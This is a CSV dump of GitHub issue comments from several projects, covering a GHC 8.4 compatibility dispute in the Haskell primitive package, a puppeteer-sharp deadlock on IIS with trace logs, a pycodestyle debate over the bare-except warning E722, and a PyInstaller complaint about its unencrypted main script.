primitive/haskell/71/354363929,"@friend I'm not sure your comments are driving this conversation in the right direction. You might reasonably argue it's not in the place it should be, and I appreciate the temptation to vent, but let's not make that this issue. @friend This bug refers to an issue that is still open, but has now been closed. I appreciate you don't want to get into a war on a bug thread, but closing bugs without saying why confuses us who report them and want to know when they are fixed. Concretely, to answer your questions I want to test with GHC 8.4.1. I want to test using my CI. I want to test exactly the same way I've tested every GHC release up until now, unless someone offers a compelling reason that a better approach makes more sense. I want to test because people asked me to test. I want to know when the issue is fixed, and thus I want to subscribe to a github ticket. I want to know if you plan on fixing this in the next week or so, only once GHC 8.4 is in Beta/RC1, or at some other point - so I can plan what I do in response. I am grateful for the work everyone does maintaining the infrastructure and packages, this one included 😄 ",False,True,False,primitive/haskell/71
primitive/haskell/71/354366152,"This isn't every ghc release until now -- it is an early alpha release, which is a new thing, part of a new release process  libraries were released in conjunction only with the candidate phase of a release. The new process was not intended to also have more libraries released for the alpha phase. Rather, the overlay package index is currently the recommended way to deal with it, as per  this wasn't the case, we'd potentially have a ton more package releases, a number of which would not be particularly compatible with any properly released version of GHC. This new alpha ghc release is uncharted territory for everyone. As per the announcement this is way earlier than normal -- the fact that we can test with it at all is forward progress. As such, this isn't a bug. It is a disagreement over the new alpha release process. Those who want to weigh in on the alpha testing process should probably do so on the ghc-devs list. ",False,True,False,primitive/haskell/71
primitive/haskell/71/354366594,"I've been tested with GHC HEAD for many years, and releasing packages to Hackage specifically to deal with GHC HEAD. To me, the process still hasn't changed (although I appreciate it has to the rest of the world). If the decision of the primitive maintainers is to not release until GHC goes into Beta, that's fine, but the resolution of this ticket should be ""Open"" and the comment should be ""We'll fix it when GHC goes into Beta, if you disagree email ghc-devs"". ",False,True,False,primitive/haskell/71
primitive/haskell/71/354366886,Except... I think that the changes are already in HEAD of  -- there's just no release cut? i.e. ,False,True,False,primitive/haskell/71
primitive/haskell/71/354367270,"Yep, then the bug is ""No released versions work with the unreleased GHC 8.4"". Concretely, GHC 8.4 has compiled binaries, and I'm testing it on my CI. I have taken action to say released primitive is not working. When that stops being the case I need to undo that action. I want to ""watch"" something, so a ticket is mightily helpful for that. I imagine when primitive does release to Hackage then @friend and @friend are going to also take some action (e.g. additional testing, reverting workarounds etc). ",False,True,False,primitive/haskell/71
pro-react-study/chungheepark/1/192082340,5일차 공부한 내용 올리기  [ ] react-router [ ] react-router-history  ,False,True,False,pro-react-study/chungheepark/1
puppeteer-sharp/kblok/736/435935614,What is  doing? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435887588,"There is something inside of  or a property missing, that doesn't allow the program to proceed ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435902159,"Something is not completly right Because I've been searching your code inside-out and even tried to find a result, I tried to make a method to find how deep i could go to find more precise as I could The bug occurrs when page is awaiting for , it never has the anwser back ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435938677,is like  but synchronous ,False,True,False,puppeteer-sharp/kblok/736
pulWifi/pulWifi/48639/15289991,"PackageName = es.pulimento.wifi VersionCode = 137 VersionName = Release 2.0.6 TRACE java.lang.RuntimeException Unable to start activity ComponentInfo{es.pulimento.wifi/es.pulimento.wifi.ui.HomeActivity} android.database.sqlite.SQLiteException table startupdialog already exists CREATE TABLE startupdialog (startupID INTEGER PRIMARY KEY, tstamp NUMERIC);     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java1659)     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java1675)     at android.app.ActivityThread.access$1500(ActivityThread.java121)     at android.app.ActivityThread$H.handleMessage(ActivityThread.java943)     at android.os.Handler.dispatchMessage(Handler.java99)     at android.os.Looper.loop(Looper.java138)     at android.app.ActivityThread.main(ActivityThread.java3701)     at java.lang.reflect.Method.invokeNative(Native Method)     at java.lang.reflect.Method.invoke(Method.java507)     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java878)     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java636)     at dalvik.system.NativeStart.main(Native Method) Caused by android.database.sqlite.SQLiteException table startupdialog already exists CREATE TABLE startupdialog (startupID INTEGER PRIMARY KEY, tstamp NUMERIC);     at android.database.sqlite.SQLiteDatabase.native_execSQL(Native Method)     at android.database.sqlite.SQLiteDatabase.execSQL(SQLiteDatabase.java1771)     at es.pulimento.wifi.ui.utils.DBHelper.onCreate(DBHelper.java47)     at es.pulimento.wifi.ui.utils.DBHelper.onUpgrade(DBHelper.java55)     at android.database.sqlite.SQLiteOpenHelper.getWritableDatabase(SQLiteOpenHelper.java132)     at es.pulimento.wifi.ui.utils.UpdateChecker.&lt;init&gt;(UpdateChecker.java62)     at es.pulimento.wifi.ui.HomeActivity.onCreate(HomeActivity.java75)     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java1047)     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java1623)     ... 11 more CAUSE TRACE android.database.sqlite.SQLiteException table startupdialog already exists CREATE TABLE startupdialog (startupID INTEGER PRIMARY KEY, tstamp NUMERIC);     at android.database.sqlite.SQLiteDatabase.native_execSQL(Native Method)     at android.database.sqlite.SQLiteDatabase.execSQL(SQLiteDatabase.java1771)     at es.pulimento.wifi.ui.utils.DBHelper.onCreate(DBHelper.java47)     at es.pulimento.wifi.ui.utils.DBHelper.onUpgrade(DBHelper.java55)     at android.database.sqlite.SQLiteOpenHelper.getWritableDatabase(SQLiteOpenHelper.java132)     at es.pulimento.wifi.ui.utils.UpdateChecker.&lt;init&gt;(UpdateChecker.java62)     at es.pulimento.wifi.ui.HomeActivity.onCreate(HomeActivity.java75)     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java1047)     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java1623)     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java1675)     at android.app.ActivityThread.access$1500(ActivityThread.java121)     at android.app.ActivityThread$H.handleMessage(ActivityThread.java943)     at android.os.Handler.dispatchMessage(Handler.java99)     at android.os.Looper.loop(Looper.java138)     at android.app.ActivityThread.main(ActivityThread.java3701)     at java.lang.reflect.Method.invokeNative(Native Method)     at java.lang.reflect.Method.invoke(Method.java507)     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java878)     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java636)     at dalvik.system.NativeStart.main(Native Method) ",False,True,False,pulWifi/pulWifi/48639
puppeteer-sharp/kblok/736/435938897,@friend how are you making that synchronous? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435939574,"Sort of, it's a ""weird specie of a bird"", That is synchronous but it waits for Tasks to be executed ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435939987,"I bet you're are locking the thread preventing Puppeteer from getting messages from chromium, you should await all the way. ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435943106,"I'm not sure about that, the Task is the responsable to get the message, besides, i already did it once, and even got the anwser, but now, i migrated to my main testbench and it blew up, and I can't even access the other IIS anymore, it doesnt allow me xD I can't do full  because most of my program doesn't support it ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435943696,That's why I'm asking how are you waiting for the task. If you do  it'll just not going to work. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435945079,"of course not. but  do, but not on ISS, trust me, i did it on windows forms but i cant do it on IIS xD ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435947663,You should never use  There are many documents talking about this  can wrap it inside a Task.Run but you should wrap your entire functionality not just pieces. Puppeteer is async by definition there is no way to change that. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435950570,"I will try, but how can you explain me is it working on windows forms, and all other methods work fine as a line? ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435955920,@friend ASP.NET and Winforms don't share the same synchronization context. This is a good reading ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/435962051,"Ok, thanks, now i have to make everything from the ground i think 👍 ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436360266,"Nop i was right, its was not my fault, i did everything, in IIS, , but still locks there. At the same point as before ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436361433,@friend can you share some testable code? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436372130,"I will try tomorrow, but today i cant ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436565064,"So, as you know there is an issue in  and here is the context HeadlessBrowser Core, Framework 1.7.x(I forgot) Now the WebApi Thumbnail, WebAPI ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436659488,BrowserContext  74 -  Was this supposed to not have an ? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436660744,"@friend we use Task cascading a lot. Instead of awaiting the task we just return it, until someone really needs to await it. This is a good read ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436709027,That's the awnser for last question. What about the code? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436715912,"Even that, in this situation, it needs to return the page or it will wait forever ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/436989844,@friend I just created a project with your code and it worked. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437013021,"@friend . We have a dotnet core 2.1 application running on IIS 7.5 using puppeteer-sharp 1.9. The server is windows 2008 R2. When is called await browser.NewPageAsync(), we received a timeout even using configureawait false. Any suggestion for us? Thanks. ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437013417,@friend I'll take a look running it on IIS. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437036211,@friend @friend reproduced guys. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437317266,Wait reproduced the bug or did you successfully executed? I got confused ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437326006,@friend I'm getting the same issue on IIS ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437802098,@friend any update about the bug? Whats the issue or what do you think it is? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/437840435,"@friend we are getting a deadlock when we use the session for the very first time  thread is being stuck there, and it doesn't let puppeteer keep listening to the WebSocket to get the answer to that command. No joy yet. ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/441081615,"Guys, I found a similar issue for puppeteer.  this case the workaround was adding --no-sandbox on chromium, is this a ""solution""? ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/441082345,"@friend I don't think so. I read a little bit about this issue and the problem is that ASP.NET thread management.  I can't confirm it yet, but it seems that ASP.NET is assigning only one thread per request and that deadlocks the execution because it doesn't allow the connection (which is using  to listen to new messages. I bet I'll be working on this after I release 1.10. ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442022145,@friend @friend could you try v1.10? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442233354,@friend any reason not to use ? For what I read in Puppeteer is something that users end up setting it when they run with restricted permissions. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442235894,"No, I think it's ok in our scenario set , we are just creating some PDFs and inside an very controlled environment. I just thought a little weird the deadlock without the arg being passed but just because I got curious to really understand the problem haha ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442238372,Would be a good thing consider to add this  argument on README? ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442231923,"I tried the v1.10, with --no-sandbox works, without it looks like the deadlock is still there. Don't know if this log can help, but that's what I got ♠trce PuppeteerSharp.Connection[0]       Send  1 Method Target.setDiscoverTargets Params { discover = True } trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""3276034a-b7f0-462b-af30-c26a3fe05f40"",""type""""browser"",""title"""""",""url"""""",""attached""false}}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""5EACC14CD88992030B76F44B4729FDDD"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""false,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""b97ca89b-6136-4bad-8de2-8aa0722e3820"",""type""""browser"",""title"""""",""url"""""",""attached""true}}} trce PuppeteerSharp.Connection[0]       ? Receive {""id""1,""result""{}} trce PuppeteerSharp.Connection[0]       Send  2 Method Target.createTarget Params [url, aboutblank] trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCreated"",""params""{""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url"""""",""attached""false,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       ? Receive {""id""2,""result""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A""}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetInfoChanged"",""params""{""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""false,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       Send  3 Method Target.attachToTarget Params { targetId = F5E5D9799EEDBC8CE189DE8BE015AD9A } trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetCrashed"",""params""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""status""""failed to launch"",""errorCode""18}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.targetInfoChanged"",""params""{""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""true,""browserContextId""""6E425A78148B53E4686790E8F708EADA""}}} trce PuppeteerSharp.Connection[0]       ? Receive {""method""""Target.attachedToTarget"",""params""{""sessionId""""87634875ECAD81B62CDC1B6CDACEA827"",""targetInfo""{""targetId""""F5E5D9799EEDBC8CE189DE8BE015AD9A"",""type""""page"",""title"""""",""url""""aboutblank"",""attached""true,""browserContextId""""6E425A78148B53E4686790E8F708EADA""},""waitingForDebugger""false}} trce PuppeteerSharp.Connection[0]       ? Receive {""id""3,""result""{""sessionId""""87634875ECAD81B62CDC1B6CDACEA827""}} trce PuppeteerSharp.CDPSession[0]       Send  1 Method Page.enable Params (null) trce PuppeteerSharp.Connection[0]       Send  4 Method Target.sendMessageToTarget Params [sessionId, 87634875ECAD81B62CDC1B6CDACEA827], [message, {""id""1,""method""""Page.enable"",""params""null}] trce PuppeteerSharp.Connection[0]       ? Receive {""id""4,""result""{}}` ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442239038,Agreed @friend. I'm also working on a better connection transport for AspNet Full Framework. As it's not recommended to use  there. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442240114,"That's great. By the way, thanks for your help on it blush ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/442373291,"Unfortunatly, i'm currently too busy to do the experience, maybe i have some time over the weekend, but until then, i dont think so ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/448817057,We just release a new package for ASP.NET Framework  one example  it a try. If you have any issues let's open another issue. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/448840679,"@friend did you figure out how to run it on windows server 2008 R2/Net Core ? @friend whats the fix thats added in PuppeteerSharp.AspNetFramework? this doesn't work with net core, need a fix for netcore application. ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/448981609,@friend some reading here  we shouldn't use Task.Run on ASP.NET. But I can't say that this is THE solution. ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/449042160,"@friend I'm not using Task.run public static void Main(string[] args) {             SavePDFUsingPuppeteerSharp(filePath, pdfFilePath).Wait(); } public static async Task SavePDFUsingPuppeteerSharp(string htmlFilePath, string pdfFilePath) {             await new BrowserFetcher().DownloadAsync(BrowserFetcher.DefaultRevision);             var browser = await Puppeteer.LaunchAsync(new LaunchOptions { Headless = true });             var page = await browser.NewPageAsync();             PdfOptions pdfOptions = new PdfOptions();             pdfOptions.PreferCSSPageSize = true;             await page.GoToAsync(htmlFilePath, WaitUntilNavigation.Load);             await page.PdfAsync(pdfFilePath, pdfOptions); } ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/449042814,@friend but the Puppeteer-Sharp connection does. PuppeteerSharp.AspNetFramework uses HostingEnvironment.QueueBackgroundWorkItem ,False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/449043371,"ah got it, PuppeteerSharp.AspNetFramework is for .netframework unfortunately i'm using .netcore..  so should I use the code and make the changes? ",False,True,False,puppeteer-sharp/kblok/736
puppeteer-sharp/kblok/736/449044070,Sorry @friend I missed that part. I'm locking the conversation on this issue. If you have any issues feel free to create a new one with the steps to reproduce it. ,False,True,False,puppeteer-sharp/kblok/736
purplapp/purplapp/64/59400147,"Yeah, please ",False,True,False,purplapp/purplapp/64
purplapp/purplapp/64/59562300,"Yeah, I'll take a look when I next get a chance. Thanks. ",False,True,False,purplapp/purplapp/64
purplapp/purplapp/64/60578082,"I updated some stuff here, tried to add it to purplapp's composer.json and I got errors like ",False,True,False,purplapp/purplapp/64
pycodestyle/PyCQA/703/271165698,"How I read PEP-8, it doesn't outlaw bare excepts, but merely recommends to catch more specific exceptions when possible. But what if there is no particular exception you want to catch, but when you just want to do some cleanup before propagating any exception? Using  isn't an option here, since we want to reuse the resource on success, and only clean up on failure. I could just explicitly catch  instead, but there is no indication in PEP-8 that this is preferable (otherwise why would bare except be supported in the first place). So How about suppressing E722, if there is a  statement in the  block? ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/342688144,"Using bare except for resource closing is a common behavior, especially when I implement context manager. The check of  should be changed to . ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/342756658,The error code E722 was implemented in #592 / (#579) and I warned about it but sigmavirus24 wasn't interested and told that I did not read the whole thread.... ,False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/342760209,"To be clear, pycodestyle doesn't do look-ahead's so we cannot silence this if there is a  in the following block. That's just not how pycodestyle has ever worked and it would require a significant rewrite to enable that kind of behaviour.  Quoting the PEP As a general rule, this new check is good. There are specific cases where people will need to do general clean-up work, as described above. Since we cannot check for people re-raising the exception in the except block, it truly is up to the user to determine whether  This check is useful to them at all or whether they feel it should be ignored globally Their particular use of a bare  is necessary and it should be ignored in that particular case (e.g., with  or ).  I would hazard a guess that 90% of pycodestyle's users will find this check worthwhile, useful, and helpful. We can not ever satisfy 100% of our users so I am happy to settle for 90%. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/342886428,"I have two (real world) scenarios  Legacy code, initially written by novices, with inappropriate use of bare except all over the place. E722 is helpful there, somewhat since this usually isn't the only issue in such legacy code, and you en up ignoring most errors there anyway. Code written by me (and similarly experienced Python developers), where bare except is used occasionally, but never without re-raising the exception. For reference, E722 is reported inappropriately three times in this project of mine.  If the design of pycodestyle doesn't allow considering the following block, in order to avoid inappropriate errors, my understanding is, that due to the potential of false positives this check should not be enabled by default, or such a check should rather be implemented in pyflakes which considers the AST and therefore is able to ignore bare excepts that re-raise the exception. I'm not going to clutter my code with  comments. IMO the purpose of a linter is to help you writing cleaner code, not to require additional boilerplate for legit practices. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/343180953,"I'm not sure if you're intentionally ignoring my suggestion to include it in the  list for your projects or if you just want to try to argue. Either way, I'm not here to argue with you. Pycodestyle is a tool used by novices and experts alike. Novices will learn from this and so will some experts. Since this is a style tool, there will always be places where some people disagree with the checks and will disable them. That's normal. Just because a handful of folks object to a rule doesn't mean we will put it in the  list even if generally speaking it has value for everyone else. As for the suggestion that pyflakes entertain a style check, you can make that argument to them, but that is typically entirely against their philosophy. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/354739800,"I just hit this as well. In my experience false positives can have a damaging effect. I've seen novices commit naive ""fixes"" for correct code. I believe this issue will cause novices to rewrite what I wrote to which will of course leave temporary files around in the case of KeyboardInterrupt/SystemExit. This check needs to see the raise, or be better worded, to steer people away from naive fixes. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/354802176,"That's kind of a bad example though because you should be using  to clean up resources. It could lead to novices getting a ""wrong"" idea, I agree, but they're already doing it wrong in the first place. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/354813471,"No, as in @friend's example, this is not an unconditional clean-up. In the happy path the file gets moved into a permanent location. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370050577,"I'm with @friend on this one, but I'd take it a little further  a bare except is inherently unpythonic.  Two important parts of python philosophy () are 'Explicit is better than implicit' and 'Special cases aren't special enough to break the rules.'. I point these out because a bare except is a special, highly implicit case. Every other  has an 'argument', indicating the scope of the error to be handles.  Even if that's 'everything', it's better to explicitly state that. 'There should be one-- and preferably only one --obvious way to do it.' also applies, since you can accomplish the same thing for the low-low price of 14 characters.  That's simply not enough of a 'savings' to make it worth it. There's also the fact that things like KeyboardInterrupt aren't caught by  for a reason.  Those represent very exceptional cases - cases which shouldn't occur in normal (e.g. production) operation unless something has gone very wrong or the user is explicitly requesting an immediate shutdown. In regards to @friend's use case Why do you want to clean up those temporary files in every possible exception case?   tells me that you don't know what exceptions may be raised.  In those (hopefully rare) cases, your app will certainly crash (unless you have a bare except that silences every possible exception, but that's really bad), and you will need to investigate why.  A temporary file is part of the state of the application at the point in time, and therefore will be forensically valuable. If you know for sure that the temporary file will be forensically worthless, then  or  makes that clear, and indicates that you're fully aware of the implications.  If you're more worried about old temporary files accumulating in some way, consider having your app do cleanup as part of initialization.  That idea comes from the Crash-only software pattern (It's a lot more reasonable than it sounds, I promise).  Basically, it's a lot easier to assume that your app always terminates unexpectedly and code against that than to handle unexpected termination as a special case (i.e. Turning off the power is guaranteed to be an option, but a shut down command may fail or be unavailable). As a last resort, there's always .  If you absolutely must break from best practices, then 8 characters is a very small price to pay. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370150368,"@friend I appreciate the support. This sounds like you're assuming all development is on continuously running applications on a remote server. Things like pycodestyle and flake8 are ""production"" applications that should handle . That said, both projects handle it explicitly. I think I understand your point, but it feels like it's imposing a false dichotomy around what is ""production"". I can imagine a few cases where @friend would want to (and should!) clean up the temporary files. Perhaps those temporary files contain some sensitive information and cleaning them up is the secure thing to do. In reality, neither of us know the details and I think we should be assuming that they know their constraints better than us. Of course having some non-sensitive temporary files lying around can be useful for debugging, but there are certainly valid cases where those shouldn't be left around no matter what exception happens. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370182512,"@friend I think you're right re imposing a false dichotomy - I'm primarily a web developer, where the dichotomy is pretty reliable. In regards to temporary files containing sensititive information, Wouldn't it be a risk to write them to disk at all?  If the power is shut off at the right moment, the data would still be there on disk, and no exception handling would have a chance to clean it up.  So that makes me think that a temporary file is the wrong tool in the first place.  I'd want to keep that in something volatile (like memory) so that it's sort of fail-safe. You're more general point is a good one. - We can't know the real requirements on a project we're not a part of.  But if those requirements do require a cleanup in all exception cases, I think we probably agree that it should be done explicitly. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370185344,"Again, there are constraints where it makes sense. I agree with you in general, but there are always exceptions to the rule. Also we're getting off topic smile ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370217530,"doesn't mean the same thing as  in Python 2; in Python 2 you could raise old-style classes as exceptions, which do not inherit from BaseException. Regarding ""I could never imagine a situation where I'd want to unconditionally clean up in the case of any exception""  In the case of temporary files, never leave them around on a production server because they can cause additional impact (eg. filling a disk volume) which can be much more serious than the original crash. Reproduce the issue in dev and diagnose. Just came across another example in the case that my event loop crashes due to programming error, I must kill my subprocesses which are now in an unknown state code.  ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370500899,"@friend I'll admit that there are some cases where  is the right call, but they're cases that pycodestyle isn't intended to handle out of the box.  Marking those with  might seem a little cluttery, but it's much more helpful to those same junior devs who would be confused by the error.  It explicitly indicates a code smell that is a necessary evil.  Ideally, you'd document why it is necessary as well so that they understand why the exception had to be made. So to go back to your initial comment, Pycodestyle isn't designed in a way that it can detect the raise, so that's a non-starter.  As for steering novices away from naive changes, that's the purpose of code review, not linting. A better solution is to prevent them from even knowing about it in the first place though, hence  and documentation. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370515167,"Or evidence that this check needs to be moved to Pyflakes, which does consider the AST, in order to eliminate this false positive. In a large organisation that is impossible. Junior people are often two or three steps removed from people who could confidently tell you what good practice looks like. We rely on linters to do this, and both the false positive and false negative rates are important. I'm not saying I'm not worried about the false negative. I'm arguing that this creates an undesirable false positive. You're assuming I'm writing code now for future novices to read. I'm concerned about the novices now maintaining the code I wrote 5 years ago when this check wasn't a thing. ",False,True,False,pycodestyle/PyCQA/703
pycodestyle/PyCQA/703/370551544,"PyFlakes wouldn't accept this for the very reason that it's so controversial. They only accept obvious problems, e.g., unused imports. If this isn't satisfactory here, a different stylistic option for having it would be via a Flake8 AST plugin. Luckily,  already provides this check using the AST but a quick check of the source indicates that it's as strict as this check is. I'd suggest either collaborating with bugbear or creating a new plugin that meets the specific needs. As it stands, this discussion seems to be getting heated. I'm going to lock the thread because it's devolved from constructive conversation to far less productive conversation. ",False,True,False,pycodestyle/PyCQA/703
pyinstaller/pyinstaller/3160/285257204,"I can't believe that the main file of PyInstaller's .exe is not encrypted. My app starts from main.py, then this file import library1.py and library2.py. Using --key and --onefile options PyInstaller encrypts all .pyc files except main.py!!! It is very easy to obtain the source code from .pyc. This is unbelievable... ",True,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/354804111,"Indeed! How foolish are these developers, they should be paying for not implementing this properly. Or even better, be put in jail! ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/354886154,"Are you serious?! -| Here  is this ""To encrypt the Python bytecode modules stored in the bundle, pass the --key=key-string argument on the command line. For this to work, you must have the PyCrypto module installed. The key-string is a string of 16 characters which is used to encrypt each file of Python byte-code before it is stored in the archive inside the executable file."" Do you understand the statement ""each file""??? This is a bug, if you close the problem with your answer you are not a serious man. The problem here is not that also with encryption it is possible to extract the key in order to obtain the source code, but that you close a bug in this way... ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355005439,"I closed this issue due to your tone/inflection If you want to submit a bug-report, do this properly, esp. providing details. ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355010710,I'm not the autor of the issue. Did you close a bug like this for the tone? ,False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355015874,"@friend Sorry, I apologize. It's the tone and the report is of poor quality. Why should I spend my spare time on this? ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355017293,"He wrote that in a Python application the main.py file is not encrypted, why is it a poor description? By the way I did a test and this is true. The main file, so the ""launcher"", is inside the .exe without .pyc extension. It has the name of the .exe file. With few minutes you can easily obtain the source code. This is a problem ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355027317,"Please see the ""maintainer note"" in ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355029783,"That is a different problem. Here the problem is not a bug on PyCrypto but in the logic of PyInstaller. The ""launcher"" of the application is not encrypted because this file is not on the pyz archive. This behaviour is wanted. It is not a problem at all if you change the documentation and write there that the code inside the main file is not encrypted. In this way a developer won't insert a ""critic"" code in the launcher but only a little piece of code for launching the application ;-) ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355031525,"If you want this to be fixed, please place an adequate(!) bounty or submit a pull-request. The requirement for byte-encryption is a commercial one (free software does not require byte-encryption since the cod is available anyway). So if you are earning money with using PyInstaller you should take parts of the development. ",False,True,False,pyinstaller/pyinstaller/3160
pyinstaller/pyinstaller/3160/355040521,Nice attitude. You bypassed my request to change documentation. Not always a developer need code encryption for ear money... I will do a lot of copy and paste of the link to this bug. Bye all ,False,True,False,pyinstaller/pyinstaller/3160
pypi-legacy/pypa/759/287761059," probably more trouble than it is worth. For one, it is py2 only, but installs for py3 as well, where it breaks immediately. Then the name ""gi"" usually is used by pygtk and should not be used by a next to worthless breaking package like  this secondary ""fake gi"" installed breaks all gtk apps. This ""fake gi"" should be removed, since it does no longer exist on github as py source. If this ""fake gi"" was deleted, everyone would benefit. ",True,True,False,pypi-legacy/pypa/759
